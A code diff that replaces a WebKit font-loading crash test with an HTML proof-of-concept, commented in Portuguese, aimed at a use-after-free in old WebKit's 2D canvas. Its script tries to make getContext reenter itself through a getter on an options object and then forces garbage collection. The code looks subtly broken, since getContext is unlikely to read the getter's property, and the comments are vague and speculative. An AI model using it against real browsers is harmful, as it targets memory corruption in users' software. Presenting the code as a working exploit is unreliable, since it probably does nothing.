@@ -1,17 +1,67 @@
+<!DOCTYPE html>
+<html>
 <head>
-<style>
-/* cache the font */
-@font-face {
-    font-family: 'uaf';
-    src: url(a.ttf);
-}
-body {
-    font-family: 'uaf';
-}
-</style>
+    <meta charset="utf-8">
+    <title>WebKit 2D Canvas Reentrancy PoC</title>
 </head>
 <body>
-    This test passes if it does not crash.
-    <iframe id="a" onload="document.getElementById('a').remove();" src="resources/document-cached-font-loading-helper.html"></iframe>
-    <iframe id="b" onload="document.getElementById('b').remove();" src="resources/document-cached-font-loading-helper.html"></iframe>
+    <h1>Teste de Reentrância - Canvas 2D (WebKit Antigo)</h1>
+    <div id="result">Executando teste...</div>
+
+<script>
+// Rotina auxiliar de coleta de lixo forçada por alocação em massa (compatível com motores antigos)
+function gc() {
+    for (let i = 0; i < 10000; i++)
+        new String("abc");
+}
+
+function testCanvasReentrancy() {
+    try {
+        let width = 300;
+        let height = 150;
+        
+        let canvas = document.createElement('canvas');
+        canvas.width = width;
+        canvas.height = height;
+
+        let innerContext = null;
+        let reentrantTriggered = false;
+
+        // Criamos um objeto de opções simulado ou manipulamos o comportamento 
+        // onde o motor acesse propriedades que permitam reentrância.
+        // Em WebKit antigo, podemos interceptar chamadas ou usar getters em objetos passados.
+        let proxyOptions = {
+            get someProperty() {
+                if (!reentrantTriggered) {
+                    reentrantTriggered = true;
+                    // Tentativa de reentrância: chamar getContext para o mesmo canvas 
+                    // enquanto o contexto anterior ainda está em processamento/alocação
+                    innerContext = canvas.getContext('2d');
+                }
+                return 10;
+            }
+        };
+
+        // Força a avaliação de propriedades/getters se o motor processar atributos de configuração
+        // Ou força o acesso acionando métodos que validam o estado do canvas.
+        let outerContext = canvas.getContext('2d', proxyOptions);
+
+        // Dispara o gatilho de GC para forçar a varredura de objetos cujos wrappers 
+        // possam estar dessincronizados do C++ subjacente em caso de UAF.
+        gc();
+
+        document.getElementById('result').innerText = 
+            `Teste concluído com sucesso (Sem crash imediato). Outer: ${!!outerContext}, Inner: ${!!innerContext}`;
+            
+    } catch (e) {
+        document.getElementById('result').innerText = `Erro capturado: ${e.message}`;
+    }
+}
+
+// Executa o teste após o carregamento da página
+window.onload = function() {
+    setTimeout(testCanvasReentrancy, 100);
+};
+</script>
 </body>
+</html>
